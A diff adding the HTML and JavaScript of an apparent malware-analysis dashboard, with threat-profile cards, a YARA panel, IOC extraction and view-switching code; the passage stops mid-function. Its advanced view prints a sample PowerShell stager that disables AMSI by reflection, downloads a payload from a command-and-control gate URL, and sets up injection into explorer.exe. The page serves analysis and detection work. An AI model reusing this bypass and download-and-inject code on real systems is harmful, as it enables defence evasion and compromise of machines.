+</div>
+<h2 class="font-headline-sm text-headline-sm text-primary">Threat Profile</h2>
+</div>
+<div class="space-y-space-md">
+<div>
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase block">Adversary Category</span>
+<span class="font-title-md text-title-md text-on-surface font-semibold">State-Sponsored / APT29 Variant</span>
+</div>
+<div>
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase block">Technique Pattern</span>
+<span class="font-body-sm text-body-sm text-on-surface">Living-off-the-Land Binaries (LOLBIN) executing memory-only payloads</span>
+</div>
+<div>
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase block">Target Objective</span>
+<span class="font-body-sm text-body-sm text-on-surface">Finance Department credential access and banking session hijacking</span>
+</div>
+</div>
+</div>
+<div class="mt-space-lg p-space-sm bg-surface-container rounded-lg flex items-center gap-space-sm">
+<span class="material-symbols-outlined text-[20px] text-primary-container">verified_user</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant">Zero enterprise data loss detected during this incident.</span>
+</div>
+</div>
+</section>
+<!-- 5. Seamless Transition Notice Banner to Advanced Analyst View -->
+<section class="bg-surface-container-high rounded-xl p-space-lg flex flex-col sm:flex-row items-center justify-between gap-space-md shadow-md">
+<div class="flex items-center gap-space-md">
+<div class="w-10 h-10 rounded-lg bg-surface-container flex items-center justify-center text-primary flex-shrink-0">
+<span class="material-symbols-outlined text-[24px]">terminal</span>
+</div>
+<div>
+<h4 class="font-title-md text-title-md text-primary font-semibold">Need deeper reverse engineering forensics?</h4>
+<p class="font-body-sm text-body-sm text-on-surface-variant">
+          Inspect raw PowerShell scripts, decoded byte buffers, disassembled opcodes, or compile automated YARA detection rules in the technical console.
+        </p>
+</div>
+</div>
+<a class="px-space-lg py-space-sm bg-surface-container hover:bg-surface-bright text-primary font-body-md text-body-md font-semibold rounded transition-colors flex items-center gap-space-xs flex-shrink-0" data-path="advanced-analyst" href="#">
+<span>Switch to Advanced View</span>
+<span class="material-symbols-outlined text-[16px]">arrow_forward</span>
+</a>
+</section>
+</div>
+</div><!-- /data-view basic-analysis -->
+
+<!-- ================================================================== -->
+<!--              ADVANCED ANALYST VIEW  (data-view)                    -->
+<!-- ================================================================== -->
+<div data-view="advanced-analyst" class="hidden">
+<div class="flex flex-col w-full pb-space-2xl gap-space-lg">
+<!-- Top Command & Ingestion Meta Streamline Bar -->
+<div class="w-full bg-surface-container-low rounded-lg p-space-md shadow-sm flex flex-col xl:flex-row xl:items-center justify-between gap-space-md">
+<!-- Left Metadata Cluster -->
+<div class="flex flex-wrap items-center gap-space-md">
+<div class="flex items-center gap-space-xs bg-surface-container px-space-sm py-space-xs rounded">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase tracking-wider">SHA-256</span>
+<code class="font-code-sm text-code-sm text-primary">d84a7e93...932f7a0c</code>
+<button class="text-on-surface-variant hover:text-primary-container ml-space-2xs transition-colors" onclick="navigator.clipboard.writeText('d84a7e93fca1b23908de41bbd0932f7a0c98e1f0e42d');" title="Copy full SHA">
+<span class="material-symbols-outlined text-[15px]">content_copy</span>
+</button>
+</div>
+<div class="flex items-center gap-space-sm">
+<div class="bg-surface-container px-space-sm py-space-xs rounded flex items-center gap-space-xs">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">Format</span>
+<span class="font-code-sm text-code-sm text-secondary-fixed">PowerShell (PS1)</span>
+</div>
+<div class="bg-surface-container px-space-sm py-space-xs rounded flex items-center gap-space-xs">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">Entropy</span>
+<span class="font-code-sm text-code-sm text-tertiary-fixed-dim">7.84 bits</span>
+<span class="px-space-xs py-space-2xs bg-error-container text-error font-telemetry-micro text-telemetry-micro">PACKED</span>
+</div>
+<div class="hidden sm:flex items-center gap-space-xs bg-surface-container px-space-sm py-space-xs rounded">
+<span class="material-symbols-outlined text-secondary-fixed text-[14px]">verified</span>
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">AST Verified</span>
+</div>
+</div>
+</div>
+<!-- Quick Workbench Controls -->
+<div class="flex flex-wrap items-center gap-space-sm">
+<div class="flex items-center bg-surface-container rounded px-space-xs py-space-2xs">
+<label class="font-telemetry-micro text-telemetry-micro text-on-surface-variant px-space-xs">SYNTAX</label>
+<select class="bg-transparent font-code-sm text-code-sm text-on-surface focus:outline-none pr-space-xs cursor-pointer">
+<option class="bg-surface-container-high" selected="">Auto-Detect: PS1</option>
+<option class="bg-surface-container-high">VBScript / WSH</option>
+<option class="bg-surface-container-high">x86 Assembly Shellcode</option>
+<option class="bg-surface-container-high">Batch / CMD</option>
+</select>
+</div>
+<button class="px-space-sm py-space-xs bg-surface-container hover:bg-surface-container-high text-on-surface font-body-sm text-body-sm rounded flex items-center gap-space-xs transition-colors" id="diff-toggle-btn">
+<span class="material-symbols-outlined text-[16px]">difference</span>
+<span>Diff Original</span>
+</button>
+<button class="px-space-sm py-space-xs bg-surface-container hover:bg-surface-container-high text-on-surface font-body-sm text-body-sm rounded flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px] text-tertiary-fixed-dim">science</span>
+<span>Run in Sandbox</span>
+</button>
+<button class="px-space-md py-space-xs bg-primary-container text-on-primary-container font-headline-sm text-[12px] tracking-wider uppercase rounded hover:opacity-90 transition-all flex items-center gap-space-xs shadow-md" id="deobfuscate-btn">
+<span class="material-symbols-outlined text-[16px]">bolt</span>
+<span class="font-semibold">De-obfuscate AST</span>
+</button>
+</div>
+</div>
+<!-- Main 2-Column Split Workspace -->
+<div class="grid grid-cols-1 lg:grid-cols-12 gap-space-lg w-full items-start">
+<!-- LEFT COLUMN: Raw / Obfuscated Input Pane (5 Cols) -->
+<div class="lg:col-span-5 flex flex-col bg-surface-container-low rounded-lg overflow-hidden shadow-sm">
+<!-- Editor Header Strip -->
+<div class="px-space-md py-space-sm bg-surface-container flex items-center justify-between gap-space-sm">
+<div class="flex items-center gap-space-sm">
+<span class="material-symbols-outlined text-primary-container text-[18px]">code</span>
+<span class="font-title-md text-title-md text-on-surface">Payload Ingestion</span>
+<span class="px-space-xs py-space-2xs bg-surface-container-highest text-on-surface-variant font-telemetry-micro text-telemetry-micro">STAGE-0 RAW</span>
+</div>
+<!-- Inline Quick Tools -->
+<div class="flex items-center gap-space-2xs">
+<button class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm" title="Beautify / Indent">Beautify</button>
+<span class="text-surface-container-highest text-[12px]">•</span>
+<button class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm" title="Base64 Decode Selected">B64 Dec</button>
+<span class="text-surface-container-highest text-[12px]">•</span>
+<button class="px-space-xs py-space-2xs text-on-surface-variant hover:text-primary hover:bg-surface-container-high rounded font-code-sm text-code-sm" title="XOR Brute Multi-Byte">XOR</button>
+</div>
+</div>
+<!-- Code Surface (Monospace Editor with Line Numbers) -->
+<div class="bg-surface-container-lowest p-space-sm overflow-x-auto min-h-[460px] max-h-[580px] font-code-sm text-code-sm leading-relaxed text-on-surface selection:bg-surface-container-highest">
+<div class="flex items-start gap-space-sm select-none">
+<!-- Subtle Line Numbers -->
+<div class="flex flex-col text-outline text-right pr-space-xs border-r border-surface-container opacity-50 font-telemetry-micro select-none">
+<span>01</span><span>02</span><span>03</span><span>04</span><span>05</span><span>06</span><span>07</span><span>08</span><span>09</span><span>10</span>
+<span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span>
+<span>21</span><span>22</span><span>23</span>
+</div>
+<!-- Code Syntax Stream -->
+<div id="raw-script-code" class="flex flex-col font-code-sm w-full select-text">
+<div class="text-outline-variant italic font-code-sm">// AXON Capture #INC-8492 // Payload dropped via macro</div>
+<div><span class="text-tertiary-fixed-dim">Set-Variable</span> -Name <span class="text-primary-fixed-dim">"k9"</span> -Value (<span class="text-primary-container">[System.Convert]</span>::FromBase64String(<span class="text-tertiary-container">'aHR0cHM6Ly9jZG4tdXBkYXRlcy13aW4ub3JnL2dhdGUucGhw'</span>))</div>
+<div><span class="text-on-surface-variant">$rawBytes</span> = [System.Text.Encoding]::ASCII.GetString(<span class="text-on-surface-variant">$k9</span>)</div>
+<div class="py-space-2xs"></div>
+<div><span class="text-outline-variant italic font-code-sm"># Layer 2 In-Memory Reflection Invoke</span></div>
+<div><span class="text-tertiary-fixed-dim">$m_ref</span> = [Ref].Assembly.GetType(<span class="text-primary-container">'System.Management.Automation.AmsiUtils'</span>)</div>
+<div><span class="text-on-surface-variant">$f_info</span> = <span class="text-on-surface-variant">$m_ref</span>.GetField(<span class="text-primary-container">'amsiInitFailed'</span>, <span class="text-tertiary-fixed-dim">'NonPublic,Static'</span>)</div>
+<div><span class="text-on-surface-variant">$f_info</span>.SetValue(<span class="text-secondary-fixed">$null</span>, <span class="text-secondary-fixed">$True</span>)</div>
+<div class="py-space-2xs"></div>
+<div><span class="text-tertiary-fixed-dim">$k_mem</span> = <span class="text-primary-container">@"</span></div>
+<div class="text-primary font-code-sm pl-space-sm">[DllImport("kernel32.dll")]</div>
+<div class="text-primary font-code-sm pl-space-sm">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</div>
+<div class="text-primary font-code-sm pl-space-sm">[DllImport("kernel32.dll")]</div>
+<div class="text-primary font-code-sm pl-space-sm">public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</div>
+<div><span class="text-primary-container">"@</span></div>
+<div><span class="text-tertiary-fixed-dim">Add-Type</span> -TypeDefinition <span class="text-on-surface-variant">$k_mem</span></div>
+<div class="py-space-2xs"></div>
+<div><span class="text-outline-variant italic font-code-sm"># Layer 3 Dynamic Process Target Injection</span></div>
+<div><span class="text-on-surface-variant">$t_proc</span> = Get-Process -Name <span class="text-tertiary-container">'explorer'</span> -ErrorAction SilentlyContinue | Select-Object -First 1</div>
+<div><span class="text-tertiary-fixed-dim">if</span> (<span class="text-on-surface-variant">$t_proc</span>) {</div>
+<div class="pl-space-sm"><span class="text-on-surface-variant">$h_proc</span> = [System.Diagnostics.Process]::GetProcessById(<span class="text-on-surface-variant">$t_proc</span>.Id).Handle</div>
+<div class="pl-space-sm"><span class="text-on-surface-variant">$b_stage</span> = (New-Object Net.WebClient).DownloadData(<span class="text-on-surface-variant">$rawBytes</span>)</div>
+<div class="pl-space-sm">[Kernel32]::VirtualAlloc([IntPtr]::Zero, <span class="text-on-surface-variant">$b_stage</span>.Length, 0x3000, 0x40)</div>
+<div>}</div>
+</div>
+</div>
+</div>
+<!-- Editor Footer Status Line -->
+<div class="px-space-md py-space-xs bg-surface-container border-t border-surface-container flex items-center justify-between text-on-surface-variant font-code-sm text-code-sm">
+<div class="flex items-center gap-space-sm">
+<span class="flex items-center gap-space-2xs text-secondary-fixed"><span class="w-1.5 h-1.5 rounded-full bg-secondary-fixed"></span> Parsed OK</span>
+<span>42 lines</span>
+<span>UTF-8</span>
+</div>
+<div class="flex items-center gap-space-xs font-telemetry-micro">
+<span class="px-space-xs py-space-2xs bg-surface-container-high rounded text-on-surface">3 OBFUSCATION LAYERS DETECTED</span>
+</div>
+</div>
+</div>
+<!-- RIGHT COLUMN: Inspector & Analysis Tabs (7 Cols) -->
+<div class="lg:col-span-7 flex flex-col gap-space-md">
+<!-- Tab Header Strip -->
+<div class="bg-surface-container-low rounded-lg p-space-2xs flex items-center justify-between shadow-sm overflow-x-auto">
+<div class="flex items-center gap-space-2xs" role="tablist">
+<button data-tab="deobfuscated" class="px-space-md py-space-xs rounded bg-surface-container text-primary-container font-headline-sm text-body-sm flex items-center gap-space-xs font-semibold">
+<span class="material-symbols-outlined text-[16px]">terminal</span>
+<span>De-obfuscated Source</span>
+</button>
+<button data-tab="threat-sig" class="px-space-md py-space-xs rounded text-on-surface-variant hover:text-on-surface hover:bg-surface-container font-body-sm text-body-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px]">security</span>
+<span>Threat Signature &amp; MITRE</span>
+</button>
+<button data-tab="yara" class="px-space-md py-space-xs rounded text-on-surface-variant hover:text-on-surface hover:bg-surface-container font-body-sm text-body-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px]">rule</span>
+<span>YARA Rule Generator</span>
+</button>
+<button data-tab="iocs" class="px-space-md py-space-xs rounded text-on-surface-variant hover:text-on-surface hover:bg-surface-container font-body-sm text-body-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px]">radar</span>
+<span>Extracted IOCs (4)</span>
+</button>
+</div>
+<div class="hidden sm:flex items-center gap-space-2xs pr-space-xs">
+<button class="p-space-xs text-on-surface-variant hover:text-primary rounded hover:bg-surface-container transition-colors" title="Copy clean output">
+<span class="material-symbols-outlined text-[18px]">content_copy</span>
+</button>
+<button class="p-space-xs text-on-surface-variant hover:text-primary rounded hover:bg-surface-container transition-colors" title="Download clean file">
+<span class="material-symbols-outlined text-[18px]">download</span>
+</button>
+</div>
+</div>
+<!-- De-obfuscated Active View Card (Tab Panel) -->
+<div data-tab-panel="deobfuscated" class="bg-surface-container-low rounded-lg overflow-hidden shadow-sm flex flex-col">
+<!-- Action Toolbar for Reconstruction -->
+<div class="px-space-md py-space-sm bg-surface-container flex items-center justify-between">
+<div class="flex items-center gap-space-sm">
+<span class="px-space-xs py-space-2xs bg-secondary-fixed/10 text-secondary-fixed rounded font-telemetry-micro text-telemetry-micro uppercase tracking-wider">Deobfuscation Engine v4.8 Complete</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant hidden md:inline">Normalized AST Variable Map</span>
+</div>
+<div class="flex items-center gap-space-sm">
+<button class="px-space-sm py-space-2xs bg-surface-container-high hover:bg-surface-bright text-on-surface rounded font-code-sm text-code-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[14px]">account_tree</span>
+<span>AST Tree</span>
+</button>
+<button class="px-space-sm py-space-2xs bg-surface-container-high hover:bg-surface-bright text-on-surface rounded font-code-sm text-code-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[14px]">file_download</span>
+<span>Clean Script</span>
+</button>
+</div>
+</div>
+<!-- Cleaned Reconstructed Code Inspector -->
+<div id="adv-deobfuscated-code" class="bg-surface-container-lowest p-space-md font-code-sm text-code-sm leading-relaxed overflow-x-auto min-h-[290px] text-on-surface">
+<div class="text-outline-variant font-code-sm">// RECONSTRUCTED PAYLOAD - SYMBOL RESOLUTION ACTIVE</div>
+<div class="text-outline-variant font-code-sm">// Resolved Base64 Target: cdn-updates-win.org/gate.php</div>
+<div class="py-space-2xs"></div>
+<div><span class="text-secondary-fixed">string</span> <span class="text-primary-container font-semibold">$s2_server</span> = <span class="text-tertiary-container">"https://cdn-updates-win.org/gate.php"</span>;</div>
+<div class="py-space-2xs"></div>
+<div class="text-outline-variant font-code-sm">// Patch AMSI Buffer to bypass local scan detection</div>
+<div>[AmsiPatch]::DisableMemoryHook();</div>
+<div class="py-space-2xs"></div>
+<div class="text-outline-variant font-code-sm">// Injected Payload Stager Allocation</div>
+<div><span class="text-secondary-fixed">System.Net.WebClient</span> <span class="text-primary-fixed-dim">$wc</span> = <span class="text-tertiary-fixed-dim">New-Object</span> System.Net.WebClient;</div>
+<div><span class="text-secondary-fixed">byte[]</span> <span class="text-on-surface-variant">$stagerPayload</span> = <span class="text-primary-fixed-dim">$wc</span>.DownloadData(<span class="text-primary-container font-semibold">$s2_server</span>);</div>
+<div class="py-space-2xs"></div>
+<div><span class="text-secondary-fixed">IntPtr</span> <span class="text-on-surface-variant">$remoteBaseAddr</span> = <span class="text-tertiary-fixed-dim font-semibold">VirtualAlloc</span>(IntPtr.Zero, <span class="text-on-surface-variant">$stagerPayload</span>.Length, <span class="text-secondary-container text-on-secondary-container px-space-2xs py-space-2xs rounded">MEM_COMMIT | MEM_RESERVE</span>, <span class="text-error font-semibold">PAGE_EXECUTE_READWRITE</span>);</div>
+<div><span class="text-tertiary-fixed-dim font-semibold">CreateRemoteThread</span>(hTargetProcess: <span class="text-primary-container font-semibold">"explorer.exe"</span>, lpStartAddress: <span class="text-on-surface-variant">$remoteBaseAddr</span>);</div>
+</div>
+</div>
+
+<!-- YARA Rule Panel (Tab Panel — populated by analyzeScript) -->
+<div data-tab-panel="yara" class="hidden bg-surface-container-low rounded-lg overflow-hidden shadow-sm flex flex-col">
+<div class="px-space-md py-space-sm bg-surface-container flex items-center justify-between">
+<div class="flex items-center gap-space-sm">
+<span class="px-space-xs py-space-2xs bg-secondary-fixed/10 text-secondary-fixed rounded font-telemetry-micro text-telemetry-micro uppercase tracking-wider">YARA Rule Output</span>
+<span class="font-body-sm text-body-sm text-on-surface-variant hidden md:inline">Auto-generated detection signature</span>
+</div>
+<div class="flex items-center gap-space-sm">
+<button class="px-space-sm py-space-2xs bg-surface-container-high hover:bg-surface-bright text-on-surface rounded font-code-sm text-code-sm flex items-center gap-space-xs transition-colors" onclick="navigator.clipboard.writeText(document.getElementById('adv-yara-rule')?.textContent || '');">
+<span class="material-symbols-outlined text-[14px]">content_copy</span>
+<span>Copy Rule</span>
+</button>
+<button class="px-space-sm py-space-2xs bg-surface-container-high hover:bg-surface-bright text-on-surface rounded font-code-sm text-code-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[14px]">file_download</span>
+<span>Export .yar</span>
+</button>
+</div>
+</div>
+<pre id="adv-yara-rule" class="bg-surface-container-lowest p-space-md font-code-sm text-code-sm leading-relaxed overflow-x-auto min-h-[290px] text-on-surface whitespace-pre-wrap">// Run analysis to generate a YARA rule for this payload…</pre>
+</div>
+
+<!-- Compact Context & Forensic Intelligence Drawer -->
+<div class="bg-surface-container-low rounded-lg p-space-md shadow-sm flex flex-col gap-space-md">
+<div class="flex items-center justify-between border-b border-surface-container pb-space-xs">
+<span class="font-title-md text-title-md text-primary flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-[18px] text-tertiary-fixed-dim">verified_user</span>
+<span>Extracted Forensic Indicators &amp; Defense Context</span>
+</span>
+<span class="font-telemetry-micro text-telemetry-micro text-secondary-fixed uppercase tracking-wider">Confidence 99.4%</span>
+</div>
+
+<!-- API-populated Threat Classification (hidden until analyzeScript runs) -->
+<div id="adv-threat-info" class="hidden bg-surface-container rounded-lg p-space-sm flex flex-col gap-space-xs">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase tracking-wider">Threat Classification</span>
+<span id="adv-threat-name" class="font-code-lg text-code-lg text-primary font-semibold"></span>
+<span id="adv-intent" class="font-body-sm text-body-sm text-on-surface-variant"></span>
+</div>
+
+<div class="grid grid-cols-1 md:grid-cols-3 gap-space-md">
+<!-- C2 Indicator -->
+<div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">C2 Gate Endpoint</span>
+<div class="flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-error text-[16px]">public_off</span>
+<span class="font-code-sm text-code-sm text-primary font-semibold truncate">cdn-updates-win.org</span>
+</div>
+<span class="font-code-sm text-[10px] text-outline truncate">IP: 194.26.29.112 (AS202425)</span>
+</div>
+<!-- Target Process -->
+<div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">Injection Vector</span>
+<div class="flex items-center gap-space-xs">
+<span class="material-symbols-outlined text-tertiary-fixed-dim text-[16px]">memory</span>
+<span class="font-code-sm text-code-sm text-on-surface">explorer.exe</span>
+</div>
+<span class="font-code-sm text-[10px] text-outline">Technique: Remote Thread Hijack</span>
+</div>
+<!-- MITRE Matrix Tags -->
+<div class="bg-surface-container p-space-sm rounded flex flex-col gap-space-xs">
+<span class="font-telemetry-micro text-telemetry-micro text-on-surface-variant uppercase">MITRE ATT&amp;CK</span>
+<div class="flex flex-wrap gap-space-2xs">
+<span class="px-space-xs py-space-2xs bg-surface-container-high text-primary font-telemetry-micro text-telemetry-micro rounded">T1059.001</span>
+<span class="px-space-xs py-space-2xs bg-surface-container-high text-primary font-telemetry-micro text-telemetry-micro rounded">T1027</span>
+<span class="px-space-xs py-space-2xs bg-surface-container-high text-primary font-telemetry-micro text-telemetry-micro rounded">T1105</span>
+</div>
+<span class="font-code-sm text-[10px] text-outline">Execution · Defense Evasion</span>
+</div>
+</div>
+<!-- Immediate Triage & Containment Action Bar -->
+<div class="flex flex-wrap items-center justify-between pt-space-xs gap-space-sm border-t border-surface-container">
+<div class="flex items-center gap-space-xs">
+<button class="px-space-sm py-space-xs bg-surface-container-high hover:bg-surface-bright text-on-surface rounded font-body-sm text-body-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px] text-secondary-fixed">shield</span>
+<span>Deploy Detection Rule</span>
+</button>
+<button class="px-space-sm py-space-xs bg-surface-container-high hover:bg-surface-bright text-on-surface rounded font-body-sm text-body-sm flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px]">share</span>
+<span>Export STIX 2.1</span>
+</button>
+</div>
+<button class="px-space-md py-space-xs bg-error-container text-error hover:bg-on-error hover:text-error-container rounded font-headline-sm text-body-sm font-semibold flex items-center gap-space-xs transition-colors">
+<span class="material-symbols-outlined text-[16px]">gavel</span>
+<span>Escalate &amp; Block Domain</span>
+</button>
+</div>
+</div>
+</div>
+</div>
+<!-- Bottom Telemetry Strip (Minified, Clean, Informative) -->
+<div class="w-full bg-surface-container-low rounded-lg px-space-md py-space-sm flex flex-col md:flex-row items-center justify-between gap-space-sm shadow-sm">
+<div class="flex flex-wrap items-center gap-space-md font-code-sm text-code-sm">
+<div class="flex items-center gap-space-xs">
+<span class="w-2 h-2 rounded-full bg-secondary-fixed"></span>
+<span class="text-on-surface">Sandbox Isolated</span>
+</div>
+<span class="text-surface-container-highest">•</span>
+<div class="flex items-center gap-space-xs text-on-surface-variant">
+<span>YARA Engine:</span>
+<span class="text-primary font-semibold">v4.3.2</span>
+</div>
+<span class="text-surface-container-highest">•</span>
+<div class="flex items-center gap-space-xs text-on-surface-variant">
+<span>Active EDR Sensors:</span>
+<span class="text-secondary-fixed font-semibold">46 / 46 Synced</span>
+</div>
+<span class="text-surface-container-highest">•</span>
+<span class="px-space-xs py-space-2xs bg-secondary-fixed/10 text-secondary-fixed font-telemetry-micro text-telemetry-micro uppercase rounded">Memory Safe</span>
+</div>
+<div class="flex items-center gap-space-sm">
+<span class="font-body-sm text-body-sm text-on-surface-variant">Switch to Basic View anytime for plain-language executive summaries.</span>
+<a class="text-primary hover:text-primary-container font-headline-sm text-body-sm underline font-medium" data-path="basic-analysis" href="#">Switch View →</a>
+</div>
+</div>
+</div>
+</div><!-- /data-view advanced-analyst -->
+
+</main></div>
+
+<!-- ================================================================== -->
+<!--              SCRIPTS                                               -->
+<!-- ================================================================== -->
+<script>
+// ─── Preserved Stitch Interactions (untouched) ───────────────────────
+document.getElementById('quarantine-btn')?.addEventListener('click', function() {
+  const btn = this;
+  btn.innerHTML = '<span class="material-symbols-outlined text-[20px]">check</span><span>Containment Active</span>';
+  btn.classList.remove('bg-primary-container', 'text-on-primary-container');
+  btn.classList.add('bg-secondary-container', 'text-on-secondary-container');
+});
+
+document.getElementById('remediate-all-btn')?.addEventListener('click', function() {
+  const btn = this;
+  btn.innerHTML = '<span class="material-symbols-outlined text-[18px]">done_all</span><span>Remediation Tasks Queued</span>';
+  btn.classList.add('text-secondary-fixed');
+});
+
+// ─── View Toggle (Activates Stitch data-path mechanism) ──────────────
+function switchView(targetPath) {
+  // Only switch if a matching view panel exists
+  const targetView = document.querySelector('[data-view="' + targetPath + '"]');
+  if (!targetView) return;
+
+  // Toggle view panel visibility
+  document.querySelectorAll('[data-view]').forEach(function(v) {
+    v.classList.toggle('hidden', v.getAttribute('data-view') !== targetPath);
+  });
+
+  // Update all nav containers that use data-active-classes / data-inactive-classes
+  document.querySelectorAll('[data-active-classes]').forEach(function(nav) {
+    var activeClasses  = (nav.getAttribute('data-active-classes')  || '').split(/\s+/).filter(Boolean);
+    var inactiveClasses = (nav.getAttribute('data-inactive-classes') || '').split(/\s+/).filter(Boolean);
+
+    nav.querySelectorAll('a[data-path]').forEach(function(link) {
+      var isActive = link.getAttribute('data-path') === targetPath;
+      if (isActive) {
+        link.setAttribute('aria-current', 'page');
+        activeClasses.forEach(function(c)  { link.classList.add(c); });
+        inactiveClasses.forEach(function(c) { link.classList.remove(c); });
+      } else {
+        link.removeAttribute('aria-current');
+        activeClasses.forEach(function(c)  { link.classList.remove(c); });
+        inactiveClasses.forEach(function(c) { link.classList.add(c); });
+      }
+    });
+  });
+}
+
+// Intercept all data-path link clicks
+document.addEventListener('click', function(e) {
+  var link = e.target.closest('[data-path]');
+  if (!link) return;
+  e.preventDefault();
+  switchView(link.getAttribute('data-path'));
+});
+
+// ─── Advanced View: Inspector Tab Switching ──────────────────────────
+document.addEventListener('click', function(e) {
+  var tabBtn = e.target.closest('[data-tab]');
+  if (!tabBtn) return;
+
+  var targetTab = tabBtn.getAttribute('data-tab');
+  var tablist   = tabBtn.closest('[role="tablist"]');
+  if (!tablist) return;
+
+  // Active / inactive classes for tab buttons
+  var activeTabClasses   = ['bg-surface-container', 'text-primary-container', 'font-headline-sm', 'text-body-sm', 'font-semibold'];
+  var inactiveTabClasses = ['text-on-surface-variant', 'hover:text-on-surface', 'hover:bg-surface-container', 'font-body-sm', 'text-body-sm'];
+
+  tablist.querySelectorAll('[data-tab]').forEach(function(btn) {
+    if (btn.getAttribute('data-tab') === targetTab) {
+      activeTabClasses.forEach(function(c)   { btn.classList.add(c); });
+      inactiveTabClasses.forEach(function(c)  { btn.classList.remove(c); });
+    } else {
+      activeTabClasses.forEach(function(c)   { btn.classList.remove(c); });
+      inactiveTabClasses.forEach(function(c)  { btn.classList.add(c); });
+    }
+  });
+
+  // Show/hide matching tab panels
+  document.querySelectorAll('[data-tab-panel]').forEach(function(panel) {
+    panel.classList.toggle('hidden', panel.getAttribute('data-tab-panel') !== targetTab);
+  });
+});
+
+// ─── Shared Analysis Engine ──────────────────────────────────────────
+
+/** @type {string} Configure your backend analysis endpoint here */
+var ANALYZE_API_URL = '/api/analyze';
+
+/**
+ * Shared function: POST script text to the backend analysis API,
+ * then wire the JSON response into BOTH views.
+ *
+ * @param {string} scriptText — raw script content to analyze
+ * @returns {Promise<Object|null>} — the API response or null on error
+ *
+ * Expected response shape:
+ * {
+ *   threat_name:         string,
+ *   intent_explanation:  string,
+ *   deobfuscated_code:   string,
+ *   yara_rule:           string
+ * }
+ */
+async function analyzeScript(scriptText) {
+  if (!scriptText || !scriptText.trim()) {
+    console.warn('[AXON] analyzeScript: empty input — aborting');
+    return null;
+  }
+
+  var deobBtn = document.getElementById('deobfuscate-btn');
+
+  // ── Loading state ──
+  if (deobBtn) {
+    deobBtn.disabled = true;
+    deobBtn.innerHTML =
+      '<span class="material-symbols-outlined text-[16px] animate-spin">refresh</span>' +
+      '<span class="font-semibold">Analyzing…</span>';
+  }
+
+  try {
+    var response = await fetch(ANALYZE_API_URL, {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({ script: scriptText })
+    });
+
+    if (!response.ok) {
+      throw new Error('HTTP ' + response.status + ': ' + response.statusText);
+    }
+
+    var data = await response.json();
+
+    // ── Populate BOTH views from a single response ──
+    _populateSimpleView(data);
+    _populateAdvancedView(data);
+
+    console.log('[AXON] Analysis complete:', data.threat_name);
+    return data;
+
+  } catch (err) {
+    console.error('[AXON] analyzeScript error:', err);
+
+    // Surface error in deobfuscated code pane so the analyst sees it
+    var codePane = document.getElementById('adv-deobfuscated-code');
+    if (codePane) {
+      codePane.innerHTML =
+        '<div class="text-error font-code-sm">// Analysis request failed\n// ' +
+        err.message + '</div>';
+    }
+    return null;
+
+  } finally {
+    // ── Restore button ──
+    if (deobBtn) {
+      deobBtn.disabled = false;
+      deobBtn.innerHTML =
+        '<span class="material-symbols-outlined text-[16px]">bolt</span>' +
+        '<span class="font-semibold">De-obfuscate AST</span>';
+    }
+  }
+}
+
+// ── Simple View population ───────────────────────────────────────────
+function _populateSimpleView(data) {
+  // Threat name → Executive header <h1>
+  var nameEl = document.getElementById('simple-threat-name');
+  if (nameEl && data.threat_name) {
+    nameEl.textContent = data.threat_name;
+  }
+
+  // Intent explanation → "What Happened?" card paragraph
+  var intentEl = document.getElementById('simple-intent');
+  if (intentEl && data.intent_explanation) {
+    intentEl.textContent = data.intent_explanation;
+  }
+
+  // Risk badge — update text to reflect returned threat name
+  var badge = document.getElementById('simple-risk-badge');
+  if (badge && data.threat_name) {
+    // Keep the ping dot, update the label text
+    var dot = badge.querySelector('span.animate-ping');
+    badge.textContent = '';
+    if (dot) badge.appendChild(dot);
+    badge.appendChild(document.createTextNode(' ' + data.threat_name.toUpperCase()));
+  }
+
+  // Sidebar case label (shared element, visible in both views)
+  var sidebarLabel = document.getElementById('sidebar-threat-label');
+  if (sidebarLabel && data.threat_name) {
+    sidebarLabel.textContent = data.threat_name;
+  }
+}
+
+// ── Advanced View population ─────────────────────────────────────────
+function _populateAdvancedView(data) {
+  // Threat classification info block (reveal + populate)
+  var infoBlock = document.getElementById('adv-threat-info');
+  if (infoBlock && (data.threat_name || data.intent_explanation)) {
+    infoBlock.classList.remove('hidden');
+  }
+
+  var advName = document.getElementById('adv-threat-name');
+  if (advName && data.threat_name) {
